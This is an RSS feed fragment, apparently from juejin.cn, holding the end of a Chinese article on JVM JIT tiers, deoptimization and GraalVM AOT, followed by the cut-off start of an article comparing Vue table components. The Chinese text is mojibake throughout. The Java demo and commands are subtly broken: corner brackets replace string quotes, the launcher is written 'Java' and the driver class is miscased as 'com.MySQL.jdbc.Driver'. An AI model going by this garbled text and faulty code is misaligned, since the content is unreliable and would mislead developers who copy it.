<li><strong>å†·å¯åŠ¨ï¼ˆè§£é‡Šå™¨/C1ï¼‰ï¼š</strong> Â ä»£ç åˆšå¼€å§‹è·‘ï¼Œå…ˆç”¨è§£é‡Šå™¨è§£é‡Šæ‰§è¡Œï¼Œæˆ–è€…ç”¨è½»é‡çº§ç¼–è¯‘å™¨ï¼ˆC1ï¼‰ç¼–è¯‘ï¼Œç›®çš„æ˜¯<strong>å¿«é€Ÿå¯åŠ¨</strong>ï¼Œè®©ç³»ç»Ÿå…ˆèƒ½ç”¨ã€‚</li>
<li><strong>çƒ­èº«ï¼ˆæ”¶é›†ç”»åƒï¼‰ï¼š</strong> Â åœ¨è·‘çš„è¿‡ç¨‹ä¸­ï¼ŒJVM ä¼šé»˜é»˜æ”¶é›†ä¿¡æ¯ï¼šå“ªäº›æ–¹æ³•è¢«è°ƒç”¨å¾—æœ€å¤šï¼Ÿå“ªä¸ª if åˆ†æ”¯ä¸€ç›´èµ°çš„æ˜¯ trueï¼Ÿ</li>
<li><strong>å³°å€¼æ€§èƒ½ï¼ˆC2ï¼‰ï¼š</strong> Â å½“æŸæ®µä»£ç â€œçƒ­â€åˆ°ä¸€å®šç¨‹åº¦ï¼ŒJVM ä¼šå¯åŠ¨é‡é‡çº§ç¼–è¯‘å™¨ï¼ˆC2ï¼‰ï¼Œåˆ©ç”¨åˆšæ‰æ”¶é›†çš„ä¿¡æ¯ï¼Œç”Ÿæˆæå…¶æ¿€è¿›çš„é«˜è´¨é‡æœºå™¨ç ã€‚</li>
</ol>
<h3 data-id="heading-7">3.2 è¿è¡Œæ—¶ç”»åƒï¼šC++ ç¼–è¯‘å™¨æ‹¿ä¸åˆ°çš„â€œä½œå¼Šå™¨â€</h3>
<p>é™æ€ç¼–è¯‘å™¨ï¼ˆå¦‚ GCCï¼‰åœ¨ç¼–è¯‘æ—¶åªèƒ½â€œçŒœâ€ä»£ç ä¼šæ€ä¹ˆè·‘ã€‚ä½† JIT åœ¨è¿è¡Œæ—¶ï¼Œæ˜¯<strong>äº²çœ¼çœ‹ç€</strong>ä»£ç è·‘çš„ã€‚å®ƒå¯ä»¥åšä¸€äº›é™æ€ç¼–è¯‘å™¨ä¸æ•¢åšçš„ä¼˜åŒ–ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li><strong>æ¿€è¿›å†…è”ï¼ˆInliningï¼‰ï¼š</strong> Â æŠŠå°æ–¹æ³•ç›´æ¥æ‘Šå¹³ï¼Œå‡å°‘è°ƒç”¨å¼€é”€ã€‚</li>
<li><strong>å»è™šåŒ–ï¼ˆDevirtualizationï¼‰ï¼š</strong> Â è™½ç„¶ä½ å†™çš„æ˜¯æ¥å£è°ƒç”¨Â <code>List.add</code>ï¼Œä½† JIT å‘ç°ä½  99% çš„æƒ…å†µä¼ è¿›æ¥çš„éƒ½æ˜¯Â <code>ArrayList</code>ï¼Œå®ƒå°±ä¼šç›´æ¥ç”Ÿæˆè°ƒç”¨Â <code>ArrayList.add</code>Â çš„æœºå™¨ç ï¼Œçœå»è™šæ–¹æ³•è¡¨æŸ¥æ‰¾ã€‚</li>
<li><strong>åˆ†æ”¯é¢„æµ‹ä¼˜åŒ–ï¼š</strong> Â å¦‚æœä¸€ä¸ªÂ <code>if (x &gt; 0)</code>Â åœ¨å‰ 1 ä¸‡æ¬¡é‡Œéƒ½æ˜¯ trueï¼ŒJIT å°±æ•¢ç›´æ¥æŒ‰ true ç¼–è¯‘ï¼ŒæŠŠ false çš„åˆ†æ”¯æ‰”æ‰ï¼ˆæˆ–è€…æ”¾å¾—å¾ˆè¿œï¼‰ã€‚ä¸‡ä¸€åæ¥å˜æˆäº† false æ€ä¹ˆåŠï¼ŸJVM ä¼šè§¦å‘Â <strong>Deoptimizationï¼ˆé€†ä¼˜åŒ–/å›é€€ï¼‰</strong> ï¼Œé€€å›åˆ°è§£é‡Šæ¨¡å¼é‡æ–°æ¥è¿‡ã€‚</li>
</ul>
<h3 data-id="heading-8">3.3 åŠ¨æ‰‹å®æµ‹ï¼šäº²çœ¼çœ‹è§ JIT å¹²æ´»</h3>
<p>æˆ‘ä»¬å¯ä»¥ç”¨ä¸€æ®µç®€å•çš„â€œçƒ­å¾ªç¯â€ä»£ç ï¼Œé…åˆ JVM å‚æ•°ï¼Œè§‚æµ‹ JIT çš„ä»‹å…¥ã€‚</p>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JitDemo</span> {
    <span class="hljs-comment">// æ¨¡æ‹Ÿä¸€ä¸ªç®€å•çš„è®¡ç®—ä»»åŠ¡</span>
    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>{
        <span class="hljs-type">long</span> s = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) s += i;
        <span class="hljs-keyword">return</span> s;
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>{
        <span class="hljs-type">long</span> x = <span class="hljs-number">0</span>;
        <span class="hljs-comment">// å¾ªç¯è°ƒç”¨è¶³å¤Ÿå¤šæ¬¡ï¼Œè§¦å‘ JIT</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> r = <span class="hljs-number">0</span>; r &lt; <span class="hljs-number">50</span>_000; r++) {
            x ^= <span class="hljs-built_in">sum</span>(<span class="hljs-number">10</span>_000);
        }
        System.out.<span class="hljs-built_in">println</span>(ã€ŒResult: ã€ + x);
    }
}
</code></pre>
<p><strong>å¤ç°æ­¥éª¤ä¸è§‚æµ‹ï¼š</strong></p>
<p>ä½ å¯ä»¥å°è¯•åœ¨å‘½ä»¤è¡Œä½¿ç”¨ä»¥ä¸‹å‚æ•°è¿è¡Œï¼š</p>
<ol>
<li><strong>è§‚å¯Ÿç¼–è¯‘è¿‡ç¨‹ï¼š</strong> <code>Java -XX:+PrintCompilation JitDemo</code><strong>ç°è±¡ï¼š</strong> Â ä½ ä¼šçœ‹åˆ°æ§åˆ¶å°ç–¯ç‹‚åˆ·å±ï¼Œè¾“å‡ºäº†å¾ˆå¤šå¸¦æœ‰Â <code>%</code>ã€<code>s!</code>Â ç­‰ç¬¦å·çš„æ—¥å¿—ã€‚è¿™ä»£è¡¨Â <code>sum</code>Â æ–¹æ³•å’ŒÂ <code>main</code>Â å¾ªç¯ä½“æ­£åœ¨è¢« JVM ä»è§£é‡Šå™¨å‡çº§åˆ° C1ï¼Œå†å‡çº§åˆ° C2 ç¼–è¯‘ã€‚</li>
<li><strong>å¼ºåˆ¶è§£é‡Šæ¨¡å¼ï¼ˆæ…¢åŠ¨ä½œï¼‰ï¼š</strong> <code>Java -Xint JitDemo</code><strong>ç°è±¡ï¼š</strong> Â è¿è¡Œé€Ÿåº¦ä¼šæ˜æ˜¾å˜æ…¢ï¼Œå› ä¸ºç¦æ­¢äº† JITï¼Œæ‰€æœ‰ä»£ç éƒ½åœ¨è§£é‡Šæ‰§è¡Œã€‚</li>
<li><strong>æ‰“å°å†…è”å†³ç­–ï¼ˆè¿›é˜¶ï¼‰ï¼š</strong> <code>Java -XX:+UnlockDiagnosticVMOptions -XX:+PrintInlining JitDemo</code><strong>ç°è±¡ï¼š</strong> Â JVM ä¼šå‘Šè¯‰ä½ ï¼Œå®ƒå†³å®šæŠŠÂ <code>sum</code>Â æ–¹æ³•çš„ä»£ç â€œæ¬â€åˆ°Â <code>main</code>Â æ–¹æ³•é‡Œå»äº†ï¼ˆInlinedï¼‰ï¼Œæ¶ˆé™¤äº†æ–¹æ³•è°ƒç”¨çš„å¼€é”€ã€‚</li>
</ol>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ Java æœåŠ¡é€šå¸¸éœ€è¦â€œé¢„çƒ­â€â€”â€”å®ƒéœ€è¦æ—¶é—´æ¥æ”¶é›†ç”»åƒï¼Œå®Œæˆä»â€œèƒ½ç”¨â€åˆ°â€œé«˜æ€§èƒ½â€çš„èœ•å˜ã€‚</p>
<h3 data-id="heading-9">â‘£ AOTï¼šä¸ºä»€ä¹ˆè¯´å®ƒâ€œç‰ºç‰²äº†åŠ¨æ€æ€§â€ï¼Ÿ</h3>
<p>æ—¢ç„¶ JIT è¿™ä¹ˆå¼ºï¼Œä¸ºä»€ä¹ˆç°åœ¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269126699%26content_type%3DArticle%26match_order%3D1%26q%3DGraalVM%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269126699&amp;content_type=Article&amp;match_order=1&amp;q=GraalVM&amp;zhida_source=entity" ref="nofollow noopener noreferrer">GraalVM</a>Â çš„Â <strong>AOTï¼ˆNative Imageï¼‰</strong> Â åˆç«äº†ï¼Ÿå› ä¸ºå®ƒè§£å†³äº† Java çš„ç—›ç‚¹ï¼š<strong>å¯åŠ¨æ…¢ã€å†…å­˜å ç”¨å¤§</strong>ã€‚ AOT æŠŠç¼–è¯‘æå‰åˆ°äº†æ„å»ºé˜¶æ®µï¼Œç›´æ¥ç”Ÿæˆæœºå™¨ç ï¼Œå¯åŠ¨å³å·…å³°ã€‚</p>
<p>ä½†å¤©ä¸‹æ²¡æœ‰å…è´¹çš„åˆé¤ã€‚AOT å¿…é¡»è¦é¢å¯¹ä¸€ä¸ªæ ¸å¿ƒé™åˆ¶ï¼š<strong>é—­ä¸–ç•Œå‡è®¾ï¼ˆClosed World Assumptionï¼‰</strong> ã€‚</p>
<h3 data-id="heading-10">4.1 ä»€ä¹ˆæ˜¯é—­ä¸–ç•Œå‡è®¾ï¼Ÿ</h3>
<p>JIT å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ è½½æ–°çš„ç±»ï¼Œå¯ä»¥éšæ—¶åŠ¨æ€ç”Ÿæˆæ–°çš„å­—èŠ‚ç ã€‚ä½† AOT ç¼–è¯‘å™¨åœ¨æ„å»ºæ—¶å¿…é¡»çŸ¥é“ï¼š <strong>â€œè¿™ä¸€è¾ˆå­ï¼Œä½ ä¼šç”¨åˆ°å“ªäº›ç±»ã€å“ªäº›æ–¹æ³•ï¼Ÿâ€</strong></p>
<p>è¿™å°±å¥½æ¯”ä½ å»æ—…è¡Œï¼ˆè¿è¡Œç¨‹åºï¼‰ï¼š</p>
<ul>
<li><strong>JIT æ¨¡å¼ï¼š</strong> Â å¸¦ç€é’±ï¼ˆJVMï¼‰ï¼Œç¼ºä»€ä¹ˆè·¯ä¸Šéšæ—¶ä¹°ï¼ˆåŠ¨æ€åŠ è½½ï¼‰ã€‚</li>
<li><strong>AOT æ¨¡å¼ï¼š</strong> Â å‡ºå‘å‰å¿…é¡»æŠŠç®±å­æ‰“åŒ…å¥½ï¼ˆç¼–è¯‘æˆäºŒè¿›åˆ¶ï¼‰ã€‚å¦‚æœåœ¨è·¯ä¸Šä½ æƒ³ç”¨ç‰™åˆ·ï¼Œä½†æ‰“åŒ…æ—¶æ²¡æ”¾è¿›å»ï¼Œé‚£ä½ å°±åœ¨è¿è¡Œæ—¶ç”¨ä¸äº†ã€‚</li>
</ul>
<h3 data-id="heading-11">4.2 åå°„ä¸åŠ¨æ€ä»£ç†çš„ä»£ä»·</h3>
<p>Java å¼ºå¤§çš„Â <strong>åå°„</strong>Â å’ŒÂ <strong>åŠ¨æ€ä»£ç†</strong>ï¼Œå¤©ç„¶æ˜¯â€œè¿è¡Œæ—¶å†³å®šâ€çš„ã€‚ æ¯”å¦‚Â <code>Class.forName(ã€Œcom.MySQL.jdbc.Driverã€)</code>ï¼Œç¼–è¯‘å™¨åœ¨é™æ€åˆ†ææ—¶ï¼Œå¾ˆéš¾çŸ¥é“è¿™ä¸ªå­—ç¬¦ä¸²åˆ°åº•å¯¹åº”å“ªä¸ªç±»ã€‚</p>
<p>å› æ­¤ï¼Œä½¿ç”¨ AOT æ—¶ï¼Œä½ å¿…é¡»<strong>æ˜¾å¼é…ç½®</strong>æˆ–ä½¿ç”¨è¾…åŠ©å·¥å…·ï¼ˆTracing Agentï¼‰ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨ï¼šâ€œå˜¿ï¼Œæˆ‘è¿è¡Œæ—¶å¯èƒ½ä¼šç”¨åˆ°Â <code>com.MySQL.jdbc.Driver</code>ï¼Œè¯·æŠŠå®ƒæ‰“åŒ…è¿›å»ã€‚â€Â <strong>è¿™å°±æ˜¯æ‰€è°“çš„â€œç‰ºç‰²åŠ¨æ€æ€§â€â€”â€”å…¶å®ä¸æ˜¯ä¸èƒ½ç”¨ï¼Œè€Œæ˜¯æŠŠâ€œè¿è¡ŒæœŸçš„éšå¿ƒæ‰€æ¬²â€å˜æˆäº†â€œæ„å»ºæœŸçš„ä¸¥æ ¼å£°æ˜â€ã€‚</strong></p>
<h3 data-id="heading-12">â‘¤ ä¸¤ä¸ªå…³é”®è¡¥å……</h3>
<p>æœ€åï¼Œä¸ºäº†è®©å¤§å®¶å¯¹è¿™å¥—ä½“ç³»çš„ç†è§£æ›´å®Œæ•´ï¼Œè¡¥å……ä¸¤ç‚¹ï¼š</p>
<ol>
<li><strong>JMMï¼ˆJava å†…å­˜æ¨¡å‹ï¼‰ï¼šè·¨å¹³å°çš„â€œé‡Œå­â€</strong> Â è·¨å¹³å°ä¸ä»…æ˜¯ API ä¸€è‡´ï¼Œè¿˜è¦Â <strong>å¹¶å‘è¯­ä¹‰ä¸€è‡´</strong>ã€‚ä¸åŒ CPUï¼ˆx86, ARMï¼‰å¯¹å†…å­˜è¯»å†™çš„ä¹±åºå¤„ç†æ˜¯ä¸åŒçš„ã€‚JMM å®šä¹‰äº†ä¸€å¥—è§„èŒƒï¼ˆHappens-Before åŸåˆ™ï¼‰ï¼Œå¼ºåˆ¶ JVM åœ¨åº•å±‚å¤„ç†å¥½Â <code>volatile</code>ã€<code>synchronized</code>Â ç­‰æŒ‡ä»¤åœ¨ä¸åŒ CPU ä¸Šçš„å†…å­˜å±éšœã€‚è¿™ä¿è¯äº†ä½ çš„å¹¶å‘ä»£ç åœ¨ Linux å’Œ Windows ä¸Šè·‘å‡ºæ¥çš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269126699%26content_type%3DArticle%26match_order%3D1%26q%3DJNI%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269126699&amp;content_type=Article&amp;match_order=1&amp;q=JNI&amp;zhida_source=entity" ref="nofollow noopener noreferrer">JNI</a>ï¼šè·¨å¹³å°çš„â€œè¾¹ç•Œâ€</strong> Â ä¸€æ—¦ä½ çš„ Java ä»£ç é€šè¿‡ JNIï¼ˆJava Native Interfaceï¼‰è°ƒç”¨äº† C/C++ åº“ï¼Œ<strong>è·¨å¹³å°ç‰¹æ€§ç«‹åˆ»å¤±æ•ˆ</strong>ã€‚ä½ éœ€è¦ä¸ºæ¯ä¸ªå¹³å°æä¾›å¯¹åº”çš„Â <code>.dll</code>Â æˆ–Â <code>.so</code>ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆç°åœ¨çš„ Java ç”Ÿæ€å°½é‡æ¨å´‡ â€œPure Javaâ€ ä¾èµ–çš„åŸå› ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-13">æ€»ç»“</h3>
<p>JVM çš„è®¾è®¡å“²å­¦ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€åœºÂ  <strong>â€œå¼€å‘æ•ˆç‡â€ä¸â€œè¿è¡Œæ•ˆç‡â€çš„å®å¤§äº¤æ˜“</strong>ã€‚</p>
<ol>
<li><strong>JVM è·¨å¹³å°</strong>ï¼šé€šè¿‡ç»Ÿä¸€çš„å­—èŠ‚ç å’Œè¿è¡Œæ—¶å±‚ï¼ŒæŠŠâ€œå¤šå¹³å°é€‚é…â€çš„å¤æ‚åº¦ä»åº”ç”¨å¼€å‘è€…è½¬ç§»ç»™äº† JVM å®ç°è€…ã€‚<strong>äº¤ä»˜ç‰©ä»â€œN ä¸ªäº§ç‰©â€å˜æˆäº†â€œ1 ä¸ª jarâ€</strong> ã€‚</li>
<li><strong>JIT è¶Šè·‘è¶Šå¿«</strong>ï¼šåˆ©ç”¨Â <strong>è¿è¡Œæ—¶ç”»åƒ</strong>Â åšæŠ•æœºä¼˜åŒ–ï¼ˆå†…è”ã€å»è™šåŒ–ï¼‰ï¼Œè™½ç„¶æœ‰é¢„çƒ­æˆæœ¬ï¼Œä½†èƒ½è¾¾åˆ°ç”šè‡³è¶…è¶Šé™æ€ç¼–è¯‘çš„å³°å€¼æ€§èƒ½ã€‚</li>
<li><strong>AOT çš„å–èˆ</strong>ï¼šåŸºäºÂ <strong>é—­ä¸–ç•Œå‡è®¾</strong>ï¼Œç”¨æ„å»ºæœŸçš„ä¸¥æ ¼æ‰«ææ¢å–äº†æé€Ÿå¯åŠ¨å’Œä½å†…å­˜ï¼Œä½†éœ€è¦å¼€å‘è€…æ‰‹åŠ¨å¤„ç†åŠ¨æ€ç‰¹æ€§ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue ä¸­åå°è¡¨æ ¼é€‰å‹ï¼ˆElement/VXE/AntDï¼‰ï¼šæˆ‘åœ¨çœŸå®é¡¹ç›®é‡Œè¸©è¿‡çš„å‘ï¼Œæ¯” Demo å¤šå¾—å¤š]]></title>    <link>https://juejin.cn/post/7597742970281132084</link>    <guid>https://juejin.cn/post/7597742970281132084</guid>    <pubDate>2026-01-22T06:22:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597742970281132084" data-draft-id="7597724783649194024" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue ä¸­åå°è¡¨æ ¼é€‰å‹ï¼ˆElement/VXE/AntDï¼‰ï¼šæˆ‘åœ¨çœŸå®é¡¹ç›®é‡Œè¸©è¿‡çš„å‘ï¼Œæ¯” Demo å¤šå¾—å¤š"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-22T06:22:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="paradeå²æœˆ"/> <meta itemprop="url" content="https://juejin.cn/user/3773179639113831"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue ä¸­åå°è¡¨æ ¼é€‰å‹ï¼ˆElement/VXE/AntDï¼‰ï¼šæˆ‘åœ¨çœŸå®é¡¹ç›®é‡Œè¸©è¿‡çš„å‘ï¼Œæ¯” Demo å¤šå¾—å¤š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3773179639113831/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    paradeå²æœˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:22:34.000Z" title="Thu Jan 22 2026 06:22:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ—¶é—´ï¼š2026/01/22</p>
<p>å¦‚æœä½ çš„é¡¹ç›®å‡ºç°è¿‡è¿™äº›æƒ…å†µï¼š</p>
<ul>
<li>è¡¨æ ¼ä¸€åŠ å›ºå®šåˆ—å°±å¼€å§‹æ ·å¼é”™ä½</li>
<li>demo è·‘å¾—å®Œç¾ï¼Œä¸Šçº¿åä¸æ–­æ”¹ bug</li>
<li>åˆå¹¶å•å…ƒæ ¼ + è™šæ‹Ÿæ»šåŠ¨æ€»ä¼šå­˜åœ¨æ ·å¼é—®é¢˜æˆ–è€…æ€§èƒ½é—®é¢˜</li>
</ul>
<p><strong>åˆ«æ€€ç–‘è‡ªå·±ä»£ç æ°´å¹³ï¼Œ90% æ˜¯é€‰å‹é—®é¢˜ã€‚</strong></p>
<p>åœ¨ Vue ç”Ÿæ€é‡Œï¼Œè¡¨æ ¼ç»„ä»¶çš„çœŸæ­£éš¾ç‚¹ä»æ¥ä¸æ˜¯"æœ‰æ²¡æœ‰æŸä¸ªåŠŸèƒ½"ï¼Œè€Œæ˜¯ï¼š</p>
<blockquote>
<p><strong>å½“å›ºå®šåˆ—ã€å¤šçº§è¡¨å¤´ã€å•å…ƒæ ¼åˆå¹¶ã€è™šæ‹Ÿæ»šåŠ¨è¿™äº›èƒ½åŠ›å åŠ æ—¶ï¼Œå®ƒè¿˜èƒ½ä¸èƒ½ç¨³å®šå·¥ä½œã€‚</strong></p>
</blockquote>
<p>è¿™ç¯‡æ–‡ç« åŸºäºçœŸå®ä¸šåŠ¡æµ‹è¯•ï¼Œå¯¹æ¯” Element Plus / VXE / Ant Design Vue / TanStack å››å¤§æ–¹æ¡ˆï¼Œ<strong>åªè®²å·¥ç¨‹å®è·µï¼Œä¸å †åŠŸèƒ½æ¸…å•</strong>ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ç»“è®ºå‰ç½®ï¼šä¸åŒåœºæ™¯æ€ä¹ˆé€‰</h2>






























<table><thead><tr><th>åœºæ™¯</th><th>æ¨èæ–¹æ¡ˆ</th><th>åŸå› </th></tr></thead><tbody><tr><td>å°ä¸­å‹é¡¹ç›® + è¿½æ±‚ç¨³å®šäº¤ä»˜</td><td>Element Plus Table / Ant Design Vue</td><td>é»˜è®¤è§‚æ„Ÿç¨³å®šï¼Œå¼€ç®±å³ç”¨</td></tr><tr><td>å¤§æ•°æ®é‡ï¼ˆ1k è¡Œä»¥ä¸Šï¼‰</td><td>VXE Grid / Table V2</td><td>å†…å»ºè™šæ‹Ÿæ»šåŠ¨ï¼Œæ€§èƒ½æ— å‹åŠ›</td></tr><tr><td>é«˜åº¦å®šåˆ¶ + å›¢é˜Ÿèƒ½åŠ›å¼º</td><td>TanStack Table+TanStack Virtual</td><td>headless æ¶æ„ï¼Œå®Œå…¨è‡ªä¸»å¯æ§</td></tr><tr><td>è¡¨æ ¼æ˜¯æ ¸å¿ƒä¸šåŠ¡ + å¤æ‚äº¤äº’</td><td>VXE Grid</td><td>ä¼ä¸šçº§èƒ½åŠ›æœ€å®Œæ•´</td></tr></tbody></table>
<p><strong>ä¸€ä¸ªåº•çº¿å¿…é¡»æ˜ç¡®ï¼š</strong></p>
<blockquote>
<p>ä¸€æ—¦ä¸šåŠ¡å‡ºç°ã€Œåˆå¹¶ + å›ºå®š + è™šæ‹Ÿæ»šåŠ¨ã€ç»„åˆï¼Œé€‰å‹é˜¶æ®µä¸è°¨æ…ï¼ŒåæœŸä¸€å®šæŒç»­è¿”å·¥ã€‚</p>
</blockquote>
<h2 data-id="heading-1">äºŒã€çœŸæ­£æ‹‰å¼€å·®è·çš„ 6 ä¸ªå…³é”®ç‚¹</h2>
<h3 data-id="heading-2">1ï¸âƒ£ é»˜è®¤è§‚æ„Ÿï¼šä¸æ˜¯"å¥½çœ‹"ï¼Œè€Œæ˜¯"ç¨³å®š"</h3>
